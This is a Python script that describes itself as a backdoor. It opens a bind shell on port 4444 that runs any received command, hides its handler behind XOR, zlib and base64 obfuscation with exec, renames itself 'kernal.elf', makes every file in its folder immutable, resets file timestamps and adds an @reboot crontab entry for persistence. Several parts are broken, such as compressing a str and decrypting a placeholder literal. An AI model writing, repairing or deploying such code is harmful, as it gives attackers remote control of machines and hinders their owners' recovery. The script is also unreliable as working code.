import os
import socket
import subprocess
import time
import base64
import zlib

# Advanced string obfuscation using XOR + zlib + base64
def advanced_obfuscate_string(s, key):
    compressed = zlib.compress(s.encode())
    xor_encrypted = ''.join(chr(b ^ ord(k)) for b, k in zip(compressed, key * (len(compressed) // len(key) + 1)))
    return base64.b64encode(xor_encrypted.encode()).decode()

def advanced_decrypt_string(enc_string, key):
    decoded = base64.b64decode(enc_string).decode()
    xor_decrypted = bytes([ord(c) ^ ord(k) for c, k in zip(decoded, key * (len(decoded) // len(key) + 1))])
    return zlib.decompress(xor_decrypted).decode()

key = 'secret_key'

# Obfuscated strings
obfuscated_host = advanced_obfuscate_string('0.0.0.0', key)
obfuscated_quit = advanced_obfuscate_string('quit', key)

# Decrypt the strings dynamically
host = advanced_decrypt_string(obfuscated_host, key)
port = 4444

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Anti-forensics and persistence
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" kernal.elf')
os.system('chattr +i *')

for file in os.listdir():
    os.utime(file, (time.time(), time.time()))

if os.name == 'posix':
    os.system(f'(crontab -l 2>/dev/null; echo "@reboot {script_path}") | crontab -')

# Define the handle_connection function to be obfuscated
handle_connection_code = '''
def hc_x1x2(cs_x1x2):
    while True:
        command = cs_x1x2.recv(1024).decode()
        if command.lower() == advanced_decrypt_string('obfuscated_quit_string', key):
            cs_x1x2.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        cs_x1x2.send(output.stdout)
'''

# Obfuscate the handle_connection function
obfuscated_handle_connection = zlib.compress(base64.b64encode(handle_connection_code.encode()).decode())

# Decode and execute the obfuscated function
exec(zlib.decompress(base64.b64decode(obfuscated_handle_connection)).decode())

# Main loop to accept connections
while True:
    cs_x1x2, addr = s.accept()
    print(f"Connection from {addr}")
    hc_x1x2(cs_x1x2)

# Close the socket (never reached in normal operation)
s.close()
